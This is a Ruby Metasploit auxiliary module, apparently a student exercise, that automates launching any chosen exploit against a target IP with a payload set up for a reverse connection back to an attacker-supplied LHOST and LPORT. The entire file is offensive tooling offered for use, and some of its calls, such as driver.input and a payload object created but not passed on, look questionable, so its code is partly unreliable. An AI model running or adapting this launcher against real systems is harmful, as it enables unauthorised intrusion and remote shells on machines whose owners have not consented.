##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Automated Exploit Launcher',
      'Description'    => %q{
        This module automatically launches a chosen exploit
        against a target system with a specified payload.
      },
      'Author'         => ['Holberton Student'],
      'License'        => MSF_LICENSE
    ))

    register_options([
      OptString.new('RHOST', [true, 'Target IP address']),
      OptString.new('EXPLOIT', [true, 'Exploit module to use']),
      OptString.new('PAYLOAD', [true, 'Payload to use']),
      OptString.new('LHOST', [true, 'Local IP for reverse connection']),
      OptInt.new('LPORT', [true, 'Local port for reverse connection', 4444])
    ])
  end

  def run
    target_ip = datastore['RHOST']
    exploit_name = datastore['EXPLOIT']
    payload_name = datastore['PAYLOAD']
    local_host = datastore['LHOST']
    local_port = datastore['LPORT']

    print_status("Launching exploit #{exploit_name} against #{target_ip} with payload #{payload_name}")

    exploit = framework.exploits.create(exploit_name)

    if exploit.nil?
      print_error("Failed to create exploit module: #{exploit_name}")
      return
    end

    exploit.datastore['RHOSTS'] = target_ip
    exploit.datastore['RHOST'] = target_ip
    exploit.datastore['LHOST'] = local_host
    exploit.datastore['LPORT'] = local_port

    payload = framework.payloads.create(payload_name)

    if payload.nil?
      print_error("Failed to create payload module: #{payload_name}")
      return
    end

    payload.datastore['LHOST'] = local_host
    payload.datastore['LPORT'] = local_port

    print_status("Running exploit...")

    begin
      exploit.exploit_simple(
        'Payload'        => payload_name,
        'LocalInput'     => driver.input,
        'LocalOutput'    => driver.output,
        'RunAsJob'       => false
      )
    rescue ::Exception => e
      print_error("Exploit failed: #{e.message}")
    end
  end
end
